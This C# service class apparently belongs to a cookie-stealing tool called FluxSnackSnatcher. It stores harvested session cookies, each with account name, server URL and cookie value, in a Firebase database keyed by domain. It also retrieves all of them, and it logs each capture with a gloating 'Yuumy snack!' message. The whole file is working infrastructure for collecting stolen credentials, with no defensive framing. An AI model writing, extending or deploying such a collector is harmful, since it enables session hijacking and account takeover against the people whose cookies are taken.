﻿using Firebase.Database;
using Firebase.Database.Query;
using FluxSnackSnatcher.Models;

namespace FluxSnackSnatcher.Services
{
    public class FirebaseService : IFirebaseService
    {
        private readonly FirebaseClient _firebaseClient;

        public FirebaseService(FirebaseClient firebaseClient)
        {
            _firebaseClient = firebaseClient;
        }

        public async Task<string> SetCookie(CookieData cookie)
        {
            try
            {
                var childElement = ExtractDomainSegment(cookie.ServerUrl);

                var cookies = await _firebaseClient
                    .Child("cookies")
                    .OnceAsync<IList<CookieData>>();

                var list = cookies.FirstOrDefault(c => c.Key.Equals(childElement))?.Object ?? new List<CookieData>();

                list.Add(cookie);

                await _firebaseClient
                    .Child("cookies")
                    .Child(childElement)
                    .PutAsync(list);

                return $"Yuumy snack! :3 | {cookie.Account} @ {cookie.ServerUrl} -> {cookie.Value}";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }


        public async Task<IDictionary<string, IList<CookieData>>> GetCookies()
        {
            try
            {
                var firebaseResult = await _firebaseClient
                    .Child("cookies")
                    .OnceAsync<IList<CookieData>>();

                var cookiesDictionary = firebaseResult
                    .ToDictionary(
                        item => item.Key,
                        item => item.Object
                    );

                return cookiesDictionary;
            }
            catch (Exception ex)
            {
                throw new Exception($"Erro ao obter cookies do Firebase: {ex.Message}", ex);
            }
        }

        private static string ExtractDomainSegment(string url)
        {
            var sections = url.Split(".");

            if (sections[0] == "www")
            {
                return sections[1];
            }

            return sections[0];
        }
    }
}
